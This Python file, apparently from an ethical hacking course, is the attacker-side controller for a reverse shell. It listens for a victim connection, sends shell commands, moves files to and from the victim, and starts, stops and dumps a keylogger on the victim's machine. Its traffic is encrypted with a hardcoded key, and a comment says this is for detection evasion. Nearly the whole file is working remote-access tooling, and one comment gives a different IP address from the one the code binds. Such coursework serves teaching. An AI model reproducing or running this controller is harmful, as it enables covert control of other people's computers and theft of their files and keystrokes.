################################################
# Authors: Korn D.,                            #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

# Import necessary libraries
import socket  # This library is used for creating socket connections.
import json  # JSON is used for encoding and decoding data in a structured format.
import os  # This library allows interaction with the operating system.
from cryptography.fernet import Fernet  # Encrypted communication for detection evasion

# Pre-shared key for encryption
psk_aes = b'-SDf80BDeTTeY7jFiydQshGVwpufGx4S9J2sANAJWrI=' # Hardcoded cuz I couldn't careless :P
cipher = Fernet(psk_aes)  # Create a Fernet cipher object for encryption

# Function to send data in a reliable way (encoded as JSON)
def reliable_send(data):
    jsondata = json.dumps(data)  # Convert data to JSON format
    encrypted_data = cipher.encrypt(jsondata.encode())  # Encrypt the JSON data
    target.send(encrypted_data)  # Send the encrypted data over the network

# Function to receive data in a reliable way (expects JSON data)
def reliable_recv():
    data = b''  # Initialize an empty byte string to hold received data
    while True:
        try:
            data += target.recv(1024)  # Receive data in chunks of 1024 bytes
            if not data:
                continue
            decrypted_data = cipher.decrypt(data)  # Decrypt the received data *added*
            return json.loads(decrypted_data.decode())  # Parse the received JSON data
        except ValueError:
            continue

# Function to upload a file to the target machine
def upload_file(file_name):
    # Open the specified file in binary read ('rb') mode.
    f = open(file_name, 'rb')
    # Read the contents of the file and send them over the network connection to the target.
    target.send(f.read())


# Function to download a file from the target machine
def download_file(file_name):
    # Open the specified file in binary write ('wb') mode.
    f = open(file_name, 'wb')
    # Set a timeout for receiving data from the target (1 second).
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        # Write the received data (chunk) to the local file.
        f.write(chunk)
        try:
            # Attempt to receive another chunk of data from the target.
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    # Reset the timeout to its default value (None).
    target.settimeout(None)
    # Close the local file after downloading is complete.
    f.close()


# Function for the main communication loop with the target
def target_communication():
    while True:
        # Prompt the user for a command to send to the target.
        command = input('* Shell~%s: ' % str(ip))
        # Send the user's command to the target using the reliable_send function.
        reliable_send(command)
        if command == 'quit':
            # If the user enters 'quit', exit the loop and close the connection.
            break
        elif command == 'clear':
            # If the user enters 'clear', clear the terminal screen.
            os.system('clear')
        elif command[:3] == 'cd ':
            # If the user enters 'cd', change the current directory on the target (not implemented).
            pass
        elif command[:8] == 'download':
            # If the user enters 'download', initiate the download of a file from the target.
            download_file(command[9:])
        elif command[:6] == 'upload':
            # If the user enters 'upload', initiate the upload of a file to the target.
            upload_file(command[7:])
        elif command == 'keylogger_start':
            # If the user enters 'keylogger_start', start the keylogger on the target.
            result = reliable_recv()
            print(result)
            pass
        elif command == 'keylogger_stop':
            # If the user enters 'keylogger_stop', stop the keylogger on the target.
            result = reliable_recv()
            print(result)
            pass
        elif command == 'keylogger_dump':
            # If the user enters 'keylogger_dump', retrieve the keylogger data from the target.
            result = reliable_recv()
            print(result)
            pass
        else:
            # For other commands, receive and print the result from the target.
            result = reliable_recv()
            print(result)


# Create a socket for the server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to a specific IP address ('192.168.1.12') and port (5555).
sock.bind(('192.168.210.143', 5555))

# Start listening for incoming connections (maximum 5 concurrent connections).
print('[+] Listening For The Incoming Connections')
sock.listen(5)

# Accept incoming connection from the target and obtain the target's IP address.
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))

# Start the main communication loop with the target by calling target_communication.
target_communication()